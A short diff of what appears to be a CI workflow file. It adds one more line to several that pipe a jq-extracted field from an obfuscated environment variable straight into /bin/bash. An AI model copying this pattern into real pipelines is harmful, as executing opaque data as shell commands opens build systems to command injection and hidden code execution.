@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$j6" | jq -r .amsq07638 | /bin/bash
           printf '%s' "$unson182" | jq -r .buqt14 | /bin/bash
           printf '%s' "$cx410" | jq -r .wsz6 | /bin/bash
+          echo $zdmbd8875 | jq -r .ppql6 | /bin/bash
 
       - name: Save output
         if: always()
